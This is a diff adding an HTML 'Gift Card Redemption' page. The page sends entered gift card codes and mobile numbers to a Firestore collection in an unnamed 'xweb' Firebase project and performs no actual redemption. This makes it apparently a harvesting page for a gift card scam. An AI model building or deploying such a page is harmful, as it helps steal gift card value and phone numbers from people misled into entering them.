@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gift Card Redemption</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #fff;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    label {
+      font-weight: bold;
+    }
+    input[type="text"], input[type="tel"] {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background-color: #febd69;
+      border: none;
+      padding: 12px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #fcae3d;
+    }
+  </style>
+  <!-- Firebase App (the core Firebase SDK) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <!-- Firebase Firestore -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <h1>Gift Card Redemption</h1>
+  <form id="gift-card-form">
+    <label for="code">Enter Code</label>
+    <input type="text" id="code" name="code" placeholder="Enter gift card code" required />
+
+    <label for="mobile-number">Enter Mobile Number</label>
+    <input type="tel" id="mobile-number" name="mobile-number" placeholder="Enter mobile number" maxlength="15" required />
+
+    <button type="submit">Redeem Code</button>
+  </form>
+
+  <script>
+     const firebaseConfig = {
+    apiKey: "AIzaSyCu2D3MO9vu8YAi-E-iuX7IlyStp97i6xg",
+    authDomain: "xweb-8cdd2.firebaseapp.com",
+    databaseURL: "https://xweb-8cdd2-default-rtdb.firebaseio.com",
+    projectId: "xweb-8cdd2",
+    storageBucket: "xweb-8cdd2.firebasestorage.app",
+    messagingSenderId: "977823262207",
+    appId: "1:977823262207:web:7e45c14817618761a2f3ca"
+  };
+
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    document.getElementById('gift-card-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const code = document.getElementById('code').value.trim();
+      const mobileNumber = document.getElementById('mobile-number').value.trim();
+
+      db.collection('giftCardRedemptions').add({
+        code: code,
+        mobileNumber: mobileNumber,
+        timestamp: new Date()
+      })
+      .then(() => {
+        alert('Gift card redemption data saved successfully.');
+        document.getElementById('gift-card-form').reset();
+      })
+      .catch((error) => {
+        alert('Error saving gift card data: ' + error.message);
+      });
+    });
+  </script>
+</body>
+</html>
